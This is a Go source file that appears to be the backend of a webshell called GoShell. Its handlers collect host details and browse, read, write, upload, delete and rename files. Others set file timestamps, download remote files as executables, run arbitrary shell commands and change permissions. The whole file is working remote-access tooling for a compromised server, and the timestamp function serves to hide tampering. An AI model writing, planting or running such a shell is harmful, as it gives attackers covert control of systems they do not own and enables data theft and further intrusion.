package custom

import (
	"errors"
	"fmt"
	"io/ioutil"
	"net/url"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/Wd0g/GoShell/lib/common"
)

func BaseInfo() (res string, err error) {
	// 1. 获取工作目录
	wd, err := os.Getwd()
	if err != nil {
		return "", err
	}

	// 2. 获取磁盘列表
	diskList := ""
	if runtime.GOOS == "windows" {
		diskList = common.GetDiskList()
	} else {
		diskList = "/"
	}

	// 3. 获取系统信息
	sys_os := runtime.GOOS
	sys_hostname, err := os.Hostname()
	if err != nil {
		return "", err
	}
	sys_arch := runtime.GOARCH
	sys_info := fmt.Sprintf("%s_%s %s", sys_os, sys_arch, sys_hostname)

	// 4. 获取当前环境用户
	user, err := user.Current()
	if err != nil {
		return "", err
	}

	res += fmt.Sprintf("%s\t%s\t%s\t%s", wd, diskList, sys_info, user.Username)
	return res, nil
}

func FileTree(dir string) (res string, err error) {
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		return "", err
	}

	for _, file := range files {
		var (
			fileName string
			fileTime string
			fileMode string
			fileSize int64
		)
		fileName = file.Name()
		if file.IsDir() {
			fileName += "/"
		}

		fileTime = file.ModTime().Format("2006-01-02 15:04:05")
		fileSize = file.Size()
		fileMode = fmt.Sprintf("%#o", file.Mode().Perm())

		res += fmt.Sprintf("%s\t%s\t%d\t%s\n", fileName, fileTime, fileSize, fileMode)
	}

	return res, nil
}

func ReadFile(fileName string) (res string, err error) {
	resBytes, err := ioutil.ReadFile(fileName)
	if err != nil {
		return "", err
	} else {
		res = string(resBytes)
	}

	return res, err
}

func WriteFile(fileName, content string) (res string, err error) {
	err = ioutil.WriteFile(fileName, []byte(content), 0644)
	if err != nil {
		return "0", err
	}
	return "1", nil
}

func DeleteFileOrDir(filePath string) (res string, err error) {
	err = os.RemoveAll(filePath)
	if err != nil {
		return "0", err
	} else {
		return "1", nil
	}

}

func DownloadFile(fileName string) (res string, err error) {
	resB, err := ioutil.ReadFile(fileName)
	return string(resB), err
}

func UploadFile(filename, content string) (res string, err error) {
	content = strings.Replace(content, "\n", "", -1)
	content = strings.Replace(content, "\r", "", -1)
	var plainContent string
	for i := 0; i < len(content); i += 2 {
		plainText, err := url.QueryUnescape("%" + content[i:i+2])
		if err != nil {
			return "", errors.New(fmt.Sprintf("url unescape error(%s)", "%"+content[i:i+2]))
		}
		plainContent += plainText
	}

	return WriteFile(filename, plainContent)
}

//TODO: 暂时只移动文件（不知道啥场景会复制文件夹）
func CopyFileOrDir(srcFile, dstFile string) (res string, err error) {
	err = common.CopyFile(srcFile, dstFile)
	if err != nil {
		res = "0"
	} else {
		res = "1"
	}
	return res, nil
}

func RenameFileOrDir(oldFile, newFile string) (res string, err error) {
	err = os.Rename(oldFile, newFile)
	if err != nil {
		return "0", err
	} else {
		return "1", nil
	}
}

func CreateDir(dir string) (res string, err error) {
	err = os.Mkdir(dir, 0755)
	if err != nil {
		return "0", err
	} else {
		return "1", nil
	}
}

func ModifyFileOrDirTime(srcFile, newTime string) (res string, err error) {
	modTime, err := time.Parse("2006-01-02 15:04:05", newTime)
	if err != nil {
		return "0", err
	}

	err = os.Chtimes(srcFile, modTime, modTime)
	if err != nil {
		return "0", err
	} else {
		return "1", nil
	}

}

func Wget(srcUrl, dstFile string) (res string, err error) {
	fileData, err := common.GetDataFromUrl(srcUrl)
	if err != nil {
		return "0", err
	}

	err = ioutil.WriteFile(dstFile, fileData, 0755)
	if err != nil {
		return "0", err
	}

	return "1", nil
}

func ExecuteCommand(cmdPath, command string) (res string, err error) {
	return common.Shell(command, cmdPath)
}

func TestSupportDBClient() (res string, err error) {
	return "mysql_close\t1", nil
}

func Chmod(srcFile string, mode string) (res string, err error) {
	modeI, err := strconv.ParseInt(mode, 0, 32)
	if err != nil {
		return "0", err
	}
	err = os.Chmod(srcFile, os.FileMode(modeI))
	if err != nil {
		return "0", err
	} else {
		return "1", nil
	}
}
